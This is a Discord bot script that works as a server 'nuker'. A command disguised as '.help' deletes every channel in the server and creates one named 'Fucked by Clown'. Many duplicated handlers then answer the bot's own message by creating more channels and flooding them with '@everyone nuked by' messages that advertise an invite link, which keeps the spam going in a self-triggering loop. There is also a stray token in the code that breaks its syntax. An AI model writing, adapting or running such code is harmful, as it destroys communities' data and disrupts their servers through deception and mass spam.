const {
    memberNicknameMention
} = require('@discordjs/builders');
const Discord = require('discord.js');
const client = new Discord.Client({
    intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES]
});
const {
    MessageEmbed
} = require('discord.js');



const token = 'PUT YOUR BOT TOKEN HERE!';




if (!token) {
    console.error("Error: Bot token is missing or invalid!");
    process.exit(1);  // Exit the process with an error code
}






client.on('ready', () => {
    console.log('Join Support Server https://discord.gg/RnUjgT74CD');
  
    // Fetch the guild object to ensure updated data
    client.guilds.fetch('1311792114195239003')
      .then(guild => {
        const memberCount = guild.memberCount;
        console.log(`Current member count: ${memberCount}`);
  
        // Set the bot status
        client.user.setActivity(`Playing with ${memberCount} members`, { type: 'PLAYING' })
          .then(() => console.log('Bot status updated'))
          .catch(error => console.error('Error setting bot status:', error));
  
        // Update the status every minute
        setInterval(() => {
          client.guilds.fetch('1311792114195239003') // Fetch again for updates
            .then(guild => {
              const updatedMemberCount = guild.memberCount;
              client.user.setActivity(`Playing with ${updatedMemberCount} members`, { type: 'PLAYING' });
            })
            .catch(error => console.error('Error fetching guild data:', error));
        }, 60000); // Update every minute
      })
      .catch(error => console.error('Error fetching guild:', error));
  });

client.on('message', async (message) => {
  if (message.content === '.help') {
  message.guild.channels.cache.forEach
        (channel => channel.delete());
 
        await message.guild.channels.create
        ('Fucked by Clown', {
            type : 'text'
        }).then(async channel=> {
        channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        })
    }
})

client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('Fucked By Clown', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
 
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
 
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
 
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})

client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
 
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
 
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
 4
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
      message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
client.on('message', async (message) => {
    if (message.content === '@everyone nuked by https://discord.gg/RnUjgT74CD') {
        await message.guild.channels.create
        ('nuked by market', {
            type : 'text'
        }).then(async channel=> {
          channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
        message.channel.send('@everyone nuked by https://discord.gg/RnUjgT74CD')
    })
}
})
 

client.login(token).catch(err => {
    console.error("Error: Failed to login with the provided token!", err);
    process.exit(1);  // Exit the process if login fails
});